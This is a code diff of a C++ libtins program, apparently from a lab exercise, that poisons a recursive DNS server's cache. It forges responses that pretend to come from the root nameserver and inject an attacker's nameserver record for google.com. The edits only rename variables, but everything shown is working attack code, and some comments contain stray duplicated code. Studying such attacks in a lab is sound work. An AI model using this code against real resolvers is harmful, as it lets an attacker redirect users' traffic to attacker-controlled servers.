@@ -16,13 +16,13 @@ int main() {
     // Configuration variables
     string victim_domain = "google.com";    // Domain to poison string victim_domain = "google.com"; - string victim_domain = "TODO";
     string request_hostname = "www.google.com";    // Target domain to spoof
-    string root_dns_ip = "10.0.0.50";    // Spoofed source (pretending to be root DNS)
-    string recursive_dns_ip = "10.0.0.40";    // Target recursive DNS server
+    string root_ns_ip = "10.0.0.50";    // Spoofed source (pretending to be root DNS)
+    string recursive_ns_ip = "10.0.0.40";    // Target recursive DNS server
     string attacker_ip = "10.0.0.10";    // Attacker's IP address
     string attacker_server_ip = "10.0.0.20";    // IP we want to redirect traffic to
     string attacker_ns = "attacker.google.com";    // Attacker's nameserver
-    string attacker_dns_ip = "10.0.0.70";    // Attacker's DNS server IP - string attacker_dns_ip = "TODO";
-    int recursive_dns_port = 12345;    // Port of recursive DNS server
+    string attacker_ns_ip = "10.0.0.70";    // Attacker's DNS server IP - string attacker_ns_ip = "TODO";
+    int recursive_ns_port = 12345;    // Port of recursive DNS server
 
     PacketSender sender;    // Packet sending utility from libtins
 
@@ -45,7 +45,7 @@ int main() {
     udp /= dns;    // Attach DNS payload
 
     // IP(destination_ip,source_ip)
-    IP ip = IP(recursive_dns_ip, attacker_ip) / udp;    // Create IP layer targeting recursive DNS server
+    IP ip = IP(recursive_ns_ip, attacker_ip) / udp;    // Create IP layer targeting recursive DNS server
 
     sender.send(ip);    // Send the initial legitimate query
 
@@ -70,8 +70,8 @@ int main() {
         ));
 
         dns.add_additional(DNS::Resource(
-            attacker_ns,    // Domain server of the attacker 
-            attacker_dns_ip,    // Attacker's DNS server IP - TODO
+            attacker_ns,    // Domain server of the attacker
+            attacker_ns_ip,    // Attacker's DNS server IP - TODO
             DNS::A,    // Type A
             DNS::IN,    // Internet class (standard)
             6000   // TTL in seconds
@@ -79,10 +79,10 @@ int main() {
 
         dns.add_additional(DNS::Resource(attacker_ns, "2001:db8::1", DNS::AAAA, DNS::IN, 6000));    // Add additional record for IPv6 address
 
-        UDP udp(recursive_dns_port, 53);    // Create UDP layer (source port: 53, destination port 12345)
+        UDP udp(recursive_ns_port, 53);    // Create UDP layer (source port: 53, destination port 12345)
         udp /= dns;    // Attach DNS payload
 
-        IP ip = IP(recursive_dns_ip, root_dns_ip) / udp;  // Create IP layer targeting recursive DNS server
+        IP ip = IP(recursive_ns_ip, root_ns_ip) / udp;  // Create IP layer targeting recursive DNS server
 
         sender.send(ip); // Send the spoofed response
         if (id % 1000 == 0) {
